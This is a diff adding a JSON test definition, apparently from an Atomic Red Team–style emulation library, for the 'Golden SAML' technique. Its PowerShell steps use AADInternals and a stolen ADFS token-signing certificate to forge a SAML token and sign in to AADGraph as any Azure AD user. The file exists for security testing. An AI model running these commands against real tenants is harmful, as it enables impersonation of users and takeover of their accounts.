@@ -1,0 +1,98 @@
+{
+  "id": "b16a03bc-1089-4dcc-ad98-30fe8f3a2b31",
+  "name": "Golden SAML",
+  "description": "Forge a \"Golden SAML\" token which allows to impersonate any Azure AD user, and authenticate to AADGraph (as a proof). \nYou will need the ADFS token signing certificate (see T1552.004 to export it).\nMore info here : https://o365blog.com/post/adfs/\n",
+  "platforms": [
+    "azure-ad"
+  ],
+  "steps": [
+    {
+      "id": "95c4f2d4-a8c5-4be4-ace9-7d0341fbdd4b",
+      "type": "execute-command",
+      "data": {
+        "command": "Import-Module AADInternals -Force\n$saml = New-AADIntSAMLToken -ImmutableID \"#{immutable_id}\" -PfxFileName \"#{certificate_path}\" -Issuer \"#{issuer_uri}\"\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\nif ($conn) { Write-Host \"`nSuccessfully connected as $($conn.User)\" } else { Write-Host \"`nThe connection failed\" }\nWrite-Host \"End of Golden SAML\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "64b9ae90-905b-4bf3-b489-7aefb04c05bf",
+      "name": "Check dependency 1/1",
+      "description": "AADInternals module must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Get-Module AADInternals) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ad51eb25-b876-4ea0-a359-bfbec332c531",
+      "name": "Resolve dependency 1/1",
+      "description": "AADInternals module must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Install-Module -Name AADInternals -Force\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "3dcc8da2-38ee-4182-979f-4a3e347fc9d3",
+      "name": "Re-check dependency 1/1",
+      "description": "AADInternals module must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Get-Module AADInternals) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "64b9ae90-905b-4bf3-b489-7aefb04c05bf",
+      "p": "on-success",
+      "o": "95c4f2d4-a8c5-4be4-ace9-7d0341fbdd4b"
+    },
+    {
+      "s": "64b9ae90-905b-4bf3-b489-7aefb04c05bf",
+      "p": "on-failure",
+      "o": "ad51eb25-b876-4ea0-a359-bfbec332c531"
+    },
+    {
+      "s": "ad51eb25-b876-4ea0-a359-bfbec332c531",
+      "p": "on-success",
+      "o": "3dcc8da2-38ee-4182-979f-4a3e347fc9d3"
+    },
+    {
+      "s": "3dcc8da2-38ee-4182-979f-4a3e347fc9d3",
+      "p": "on-failure",
+      "o": "95c4f2d4-a8c5-4be4-ace9-7d0341fbdd4b"
+    }
+  ],
+  "tags": [
+    "T1606.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "certificate_path",
+      "type": "path",
+      "description": "Token signing certificate path. See T1552.004 to export it",
+      "value": ".\\ADFS_signing.pfx"
+    },
+    {
+      "name": "immutable_id",
+      "type": "string",
+      "description": "ImmutableId of the targeted user. It can be obtained with AzureAD powershell module; $(Get-AzureADUser -SearchString \"username\").ImmutableId",
+      "value": "aehgdqBTZV50DKQZmNJ8mg=="
+    },
+    {
+      "name": "issuer_uri",
+      "type": "string",
+      "description": "Issuer URI of the ADFS service",
+      "value": "http://contoso.com/adfs/services/trust/"
+    }
+  ]
+}
